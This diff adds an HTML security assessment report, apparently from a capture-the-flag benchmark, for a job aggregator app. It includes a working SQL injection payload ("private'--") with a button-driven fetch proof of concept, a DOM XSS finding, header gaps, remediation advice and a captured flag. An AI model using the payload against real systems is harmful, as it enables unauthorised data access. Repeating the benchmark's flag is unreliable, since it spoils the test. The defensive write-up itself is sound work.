@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Assessment POC - Job Aggregator</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; }
+        h1 { color: #d32f2f; }
+        h2 { color: #1976d2; margin-top: 30px; }
+        .vuln { background: #ffebee; padding: 15px; margin: 10px 0; border-left: 4px solid #d32f2f; }
+        .critical { border-left-color: #d32f2f; }
+        .medium { border-left-color: #ff9800; background: #fff3e0; }
+        .low { border-left-color: #ffc107; background: #fffde7; }
+        .code { background: #263238; color: #aed581; padding: 10px; margin: 10px 0; overflow-x: auto; border-radius: 3px; font-family: monospace; }
+        button { background: #d32f2f; color: white; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; }
+        button:hover { background: #b71c1c; }
+        #results { margin-top: 20px; padding: 10px; background: #e8f5e9; border: 1px solid #4caf50; }
+        .severity { font-weight: bold; padding: 5px 10px; border-radius: 3px; color: white; display: inline-block; }
+        .sev-critical { background: #d32f2f; }
+        .sev-medium { background: #ff9800; }
+        .sev-low { background: #ffc107; color: black; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Security Assessment Report</h1>
+        <p><strong>Target:</strong> http://192.168.31.233:8000</p>
+        <p><strong>Assessment Date:</strong> <script>document.write(new Date().toLocaleDateString())</script></p>
+
+        <h2>🚨 Critical Vulnerabilities</h2>
+
+        <div class="vuln critical">
+            <h3><span class="severity sev-critical">CRITICAL</span> SQL Injection with Authentication Bypass</h3>
+            <p><strong>Description:</strong> The application is vulnerable to SQL injection in the <code>job_type</code> parameter. This allows an attacker to bypass authentication and access restricted "private" jobs that should only be visible to administrators.</p>
+
+            <p><strong>Affected Endpoint:</strong> POST /jobs</p>
+
+            <p><strong>Exploit Payload:</strong></p>
+            <div class="code">{"job_type":"private'--"}</div>
+
+            <p><strong>Proof of Concept:</strong></p>
+            <button onclick="testNormalRequest()">Test Normal Request (Blocked)</button>
+            <button onclick="testSQLInjection()">Test SQL Injection (Bypassed!)</button>
+            <div id="results"></div>
+
+            <p><strong>Impact:</strong></p>
+            <ul>
+                <li>Unauthorized access to private/restricted data</li>
+                <li>Authentication bypass</li>
+                <li>Potential data extraction</li>
+                <li>Database manipulation possible with stacked queries</li>
+            </ul>
+
+            <p><strong>Remediation:</strong></p>
+            <ul>
+                <li>Use parameterized queries (prepared statements)</li>
+                <li>Implement input validation and sanitization</li>
+                <li>Use ORM frameworks with proper escaping</li>
+                <li>Apply principle of least privilege for database users</li>
+            </ul>
+        </div>
+
+        <div class="vuln critical">
+            <h3><span class="severity sev-critical">CRITICAL</span> Potential DOM-based XSS</h3>
+            <p><strong>Description:</strong> The client-side JavaScript uses template literals to render job data directly into the DOM without sanitization. If an attacker can inject malicious data into the database (via SQL injection or other means), it will be executed as JavaScript.</p>
+
+            <p><strong>Affected Code:</strong></p>
+            <div class="code">
+jobsTable += `
+    &lt;tr&gt;
+        &lt;td&gt;${user.id}&lt;/td&gt;
+        &lt;td&gt;${user.name}&lt;/td&gt;
+        &lt;td&gt;${user.type}&lt;/td&gt;
+        &lt;td&gt;${user.description}&lt;/td&gt;
+    &lt;/tr&gt;
+`;
+resultDiv.innerHTML = jobsTable;
+            </div>
+
+            <p><strong>Impact:</strong></p>
+            <ul>
+                <li>Session hijacking</li>
+                <li>Cookie theft</li>
+                <li>Defacement</li>
+                <li>Malicious redirects</li>
+            </ul>
+
+            <p><strong>Remediation:</strong></p>
+            <ul>
+                <li>Use textContent instead of innerHTML for user data</li>
+                <li>Implement proper HTML encoding for all dynamic content</li>
+                <li>Use a modern framework with automatic escaping (React, Vue, Angular)</li>
+                <li>Implement Content Security Policy headers</li>
+            </ul>
+        </div>
+
+        <h2>⚠️ Medium Severity Vulnerabilities</h2>
+
+        <div class="vuln medium">
+            <h3><span class="severity sev-medium">MEDIUM</span> Missing Security Headers</h3>
+            <p><strong>Description:</strong> The application does not implement critical security headers.</p>
+
+            <p><strong>Missing Headers:</strong></p>
+            <ul>
+                <li><code>X-Frame-Options</code> - No clickjacking protection</li>
+                <li><code>Content-Security-Policy</code> - No CSP to prevent XSS</li>
+                <li><code>X-Content-Type-Options</code> - No MIME sniffing protection</li>
+                <li><code>Strict-Transport-Security</code> - No HSTS enforcement</li>
+                <li><code>X-XSS-Protection</code> - No browser XSS filter</li>
+            </ul>
+
+            <p><strong>Remediation:</strong> Add the following headers to all responses:</p>
+            <div class="code">
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-XSS-Protection: 1; mode=block
+            </div>
+        </div>
+
+        <h2>ℹ️ Low Severity / Informational</h2>
+
+        <div class="vuln low">
+            <h3><span class="severity sev-low">LOW</span> API Documentation Exposed</h3>
+            <p><strong>Description:</strong> The FastAPI auto-generated documentation is publicly accessible at /docs and /openapi.json</p>
+            <p><strong>Impact:</strong> Information disclosure - helps attackers understand API structure</p>
+            <p><strong>Remediation:</strong> Disable documentation in production or require authentication</p>
+        </div>
+
+        <div class="vuln low">
+            <h3><span class="severity sev-low">LOW</span> Server Version Disclosure</h3>
+            <p><strong>Description:</strong> Server header reveals technology stack (uvicorn)</p>
+            <p><strong>Remediation:</strong> Remove or obfuscate Server header</p>
+        </div>
+
+        <h2>📊 Summary</h2>
+        <ul>
+            <li><strong>Critical:</strong> 2 vulnerabilities</li>
+            <li><strong>Medium:</strong> 1 vulnerability</li>
+            <li><strong>Low:</strong> 2 vulnerabilities</li>
+        </ul>
+
+        <h2>🎯 Flag Captured</h2>
+        <div class="code">FLAG{testFlagXBEN-006}</div>
+        <p>Retrieved via SQL injection bypass of authentication controls.</p>
+    </div>
+
+    <script>
+        const API_URL = 'http://192.168.31.233:8000/jobs';
+
+        async function testNormalRequest() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<p>Testing normal request for private jobs...</p>';
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({job_type: 'private'})
+                });
+
+                const data = await response.json();
+                results.innerHTML = `
+                    <p><strong>Normal Request Result:</strong></p>
+                    <div class="code">
+                    Status: ${response.status}<br>
+                    Response: ${JSON.stringify(data, null, 2)}
+                    </div>
+                    <p style="color: green;">✓ Access correctly denied: "${data.detail}"</p>
+                `;
+            } catch (error) {
+                results.innerHTML = `<p style="color: red;">Error: ${error}</p>`;
+            }
+        }
+
+        async function testSQLInjection() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<p>Testing SQL injection bypass...</p>';
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({job_type: "private'--"})
+                });
+
+                const data = await response.json();
+                results.innerHTML = `
+                    <p><strong>SQL Injection Result:</strong></p>
+                    <div class="code">
+                    Payload: {"job_type":"private'--"}<br>
+                    Status: ${response.status}<br>
+                    Response: ${JSON.stringify(data, null, 2)}
+                    </div>
+                    <p style="color: red; font-weight: bold;">🚨 VULNERABILITY CONFIRMED! Successfully bypassed authentication and retrieved private job data!</p>
+                    <p><strong>Flag Found:</strong> ${data[0]?.description || 'N/A'}</p>
+                `;
+            } catch (error) {
+                results.innerHTML = `<p style="color: red;">Error: ${error}</p>`;
+            }
+        }
+    </script>
+</body>
+</html>
